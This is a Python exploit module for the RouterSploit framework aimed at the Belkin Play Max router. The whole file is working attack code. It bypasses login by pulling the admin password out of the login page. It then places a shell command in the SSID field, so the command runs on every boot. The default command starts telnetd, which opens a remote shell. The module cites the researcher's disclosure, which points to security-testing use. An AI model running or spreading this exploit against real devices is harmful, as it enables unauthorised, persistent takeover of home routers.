import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_status,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Persistent remote command execution.
    If the target is vulnerable, you can run a bash command at every boot.
    """
    __info__ = {
        'name': 'Belkin Play Max Persistent RCE',
        'description': 'Module exploits Belkin SSID injection vuln, allowing to execute arbitrary command at every boot',
        'authors': [
            'BigNerd95 (Lorenzo Santina) https://github.com/bignerd95',  # vulnerability discovery and routersploit module
        ],
        'references': [
            'https://bignerd95.blogspot.it/2017/02/belkin-play-max-persistent-remote.html',
            'https://gist.github.com/BigNerd95/c18658b472ac0ccf4dbbc73fe988b683'
        ],
        'devices': [
            'Belkin Play Max (F7D4401)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port', validators=validators.integer)
    cmd = exploits.Option('telnetd', 'Command to execute')

    def auth_bypass(self):
        url = "{}:{}/login.stm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False

        val = re.findall('password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            url = "{}:{}/login.cgi".format(self.target, self.port)
            payload = "pws=" + val[0] + "&arc_action=login&action=Submit"

            login = http_request(method="POST", url=url, data=payload)
            if login is None:
                return False

            error = re.search('loginpserr.stm', login.text)

            if not error:
                print_success("Exploit success, you are now logged in!")
                return True

        print_error("Exploit failed. Device seems to be not vulnerable.")
        return False

    def inject_command(self):
        ssid_url = "{}:{}/wireless_id.stm".format(self.target, self.port)
        response = http_request(method="GET", url=ssid_url)
        if response is None:
            print_error("Exploit failed. No response from target!")
            return

        srcSSID = re.search("document\.tF\['ssid'\]\.value=\"(.*)\";", response.text)
        if srcSSID:
            SSID = srcSSID.group(1)
        else:
            print_error("Exploit failed. Are you logged in?")
            return

        if len(SSID) + 2 + len(self.cmd) > 32:
            newlen = 32 - len(self.cmd) - 2
            SSID = SSID[0:newlen]
            print_status("SSID too long, it will be truncated to: " + SSID)

        newSSID = SSID + "%3B" + self.cmd + "%3B"

        payload = "page=radio.asp&location_page=wireless_id.stm&wl_bssid=&wl_unit=0&wl_action=1&wl_ssid=" + newSSID + "&arc_action=Apply+Changes&wchan=1&ssid=" + newSSID
        url = "{}:{}/apply.cgi".format(self.target, self.port)
        response = http_request(method="POST", url=url, data=payload)

        if response is None:
            print_error("Exploit failed. No response from target!")
            return

        err = re.search('countdown\(55\);', response.text)
        if err:
            print_success("Exploit success, wait until router reboot.")
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    def run(self):
        if self.auth_bypass():
            self.inject_command()

    @mute
    def check(self):
        url = "{}:{}/login.stm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        val = re.findall('password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target is vulnerable

        return False  # target is not vulnerable
